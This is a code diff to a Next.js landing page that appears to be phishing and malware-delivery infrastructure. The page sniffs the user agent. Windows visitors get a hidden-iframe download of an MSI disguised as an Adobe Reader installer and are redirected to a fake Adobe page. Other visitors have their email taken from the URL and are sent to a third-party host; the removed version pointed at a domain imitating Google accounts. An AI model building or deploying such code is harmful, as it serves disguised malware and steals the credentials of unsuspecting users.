@@ -1,4 +1,3 @@
-// pages/index.js
 import { useEffect } from 'react';
 
 export default function Home() {
@@ -6,40 +5,47 @@ export default function Home() {
     const userAgent = navigator.userAgent || '';
     const isWindows = /windows/i.test(userAgent);
 
+    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
+
+    // 1. Windows users → MSI download, then redirect
     if (isWindows) {
-      // Windows: trigger MSI download + redirect to Adobe
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/Reader_en_install.msi'; // make sure the MSI file is in /public
+      iframe.src = '/Reader_adobe_install_online.msi';
       document.body.appendChild(iframe);
 
       setTimeout(() => {
-        window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
+        window.location.href =
+          'https://mksonline.com.mx/css/adobe/reader/download.html';
       }, 2000);
+
       return;
     }
 
-    // Non-Windows users: grab email from hash or &smn=
-    let email = '';
-    const fullUrl = window.location.href;
+    // 2. Non-Windows → grab email from hash/query
+    const url = new URL(window.location.href);
+    let email = "";
 
-    // 1. Try hash first (#connie@...)
-    if (window.location.hash) {
-      email = window.location.hash.slice(1); // remove #
+    // A) Hash ( #email@example.com )
+    if (url.hash) {
+      email = url.hash.substring(1);
     }
 
-    // 2. Fallback: try &smn= or ?smn= in URL
-    if (!email) {
-      const match = fullUrl.match(/[?&]smn=([^&]+)/);
-      if (match && match[1]) email = match[1];
+    // B) Query parameters ?email=
+    if (!email && url.searchParams.get("email")) {
+      email = url.searchParams.get("email");
     }
 
-    if (email) {
-      // Redirect to Non-Windows target with raw email
-      window.location.href =
-        `https://accounts.fcudkl.icu?X0zS-ro7JkPyrQ=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t&smn=${email}`;
+    // C) Fallback ?smn=
+    if (!email && url.searchParams.get("smn")) {
+      email = url.searchParams.get("smn");
     }
+
+    // 3. Redirect with fragment (keep @ as is)
+    const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
+
+    window.location.href = finalUrl;
   }, []);
 
-  return null; // blank page while redirecting
+  return null;
 }
